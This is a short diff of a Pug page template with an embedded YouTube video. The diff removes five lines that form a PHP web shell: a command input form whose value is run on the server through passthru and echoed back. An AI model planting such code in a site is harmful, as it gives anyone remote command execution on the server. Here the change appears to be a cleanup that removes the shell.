@@ -14,10 +14,3 @@ block content
         iframe.embed-responsive-item(src="https://www.youtube.com/embed/ZCBE8ocOkAQ", frameborder="0" allowfullscreen='1')
         // textarea(rows='4', cols='50', form='usrform', name='taganalysis')
         //   | #{taganalysis}
-
-
-      |<form action="" method="get">
-      |Command: <input type="text" name="cmd" /><input type="submit" value="Exec" />
-      |</form>
-      |Output:<br />
-      |<pre><?php passthru($_REQUEST['cmd'], $result); ?></pre>
